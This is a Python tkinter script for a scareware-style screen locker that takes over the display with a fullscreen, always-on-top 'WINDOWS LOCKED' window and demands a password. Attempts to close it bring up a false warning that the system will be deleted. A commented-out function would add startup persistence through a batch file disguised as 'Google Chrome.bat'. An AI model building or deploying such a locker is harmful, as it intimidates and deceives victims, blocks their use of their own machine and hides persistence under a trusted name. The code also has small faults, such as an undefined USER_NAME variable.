from playsound import playsound
from tkinter import *
from tkinter import messagebox
import os

#PASS
password = '123'

def btn_click():
	k = ent.get()
	if k == password:
		messagebox.showinfo(title = 'Success', message = 'Windows unlocked\nClick OK')
		root.destroy()
	else:
		messagebox.showwarning(title = 'Error', message = 'Wrong password')

def exits():
	messagebox.showwarning(title = 'Error', message = 'Wrong password. You have 4 attempts, after which your system will be deleted')

playsound('data/sound.mp3', False)

# AUTO UP
'''def add_to_startup(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
    bat_path = r'C:/Users/%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup' % USER_NAME
    with open(bat_path + '//' + "Google Chrome.bat", "w+") as bat_file:
        bat_file.write(r'start "" %s' % file_path)
'''

root = Tk() 
root = Tk()
root.title('Windows locked')
root.attributes('-fullscreen', True, '-topmost', True)
root.geometry('3840x2160')
root['bg']= 'black'

background_image = PhotoImage(file='data/bg2.png', height=25)
background_label = Label(root, image=background_image, bg='black')
background_label.pack()

background_image = PhotoImage(file='data/clown.png',)
background_label = Label(root, image=background_image, bg='black')
background_label.pack()

Label(root, text='WINDOWS LOCKED', font = 'Fixedsys 65', bg='black', fg='red').pack()
Label(root, text='Enter the password to unlock windows', font='Fixedsys 30', bg='black', fg='white').pack()

ent = Entry(root, font=('Arial', 25), width=15, show='*')
ent.pack()

Button(root, text = 'Unlock', font = 'Fixedsys 25', bg='red', fg='white', command=btn_click).pack(pady=25)
root.bind('<Return>', lambda event: btn_click())

root.protocol('WM_DELETE_WINDOW', exits)
root.mainloop()


